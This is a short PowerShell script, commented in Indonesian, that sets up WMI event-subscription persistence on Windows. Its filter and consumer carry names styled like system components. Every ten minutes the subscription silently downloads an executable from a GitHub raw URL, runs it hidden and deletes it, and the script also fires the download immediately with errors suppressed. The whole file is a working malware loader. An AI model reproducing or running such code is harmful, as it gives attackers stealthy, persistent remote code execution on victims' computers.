$ErrorActionPreference = "SilentlyContinue"

# ===== Konfigurasi =====
$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/noobs.exe'
$temp = 'C:\Windows\Temp\ldr.exe'
$filterName = 'Microsoft-Windows-SystemSecurity'
$consumerName = 'WindowsSystemMaintenance'
$interval = 600   # 600 detik = 10 menit

# ===== Hapus subscription lama =====
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
    Where-Object { $_.Filter -like "*$filterName*" -or $_.Consumer -like "*$consumerName*" } |
    Remove-WmiObject

Get-WmiObject -Namespace root\subscription -Class __EventFilter |
    Where-Object { $_.Name -eq $filterName } |
    Remove-WmiObject

Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
    Where-Object { $_.Name -eq $consumerName } |
    Remove-WmiObject

# ===== Skrip download + execute + cleanup (tanpa -Wait) =====
$downloadCommand = "try { iwr '$url' -OutFile '$temp' -UseBasicParsing; Unblock-File '$temp'; Start-Process '$temp' -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item '$temp' -Force } catch {}"

# Command untuk WMI consumer (bungkus dengan powershell -c)
$consumerCommand = "powershell -NoP -WindowStyle Hidden -c `"$downloadCommand`""

# ===== Buat event filter =====
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $filterName
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN $interval WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# ===== Buat consumer =====
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $consumerCommand
}

# ===== Binding filter dan consumer =====
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# ===== Eksekusi langsung sebagai tes (asinkron, tidak memblokir) =====
Start-Process powershell -ArgumentList "-NoP -WindowStyle Hidden -c `"$downloadCommand`"" -WindowStyle Hidden
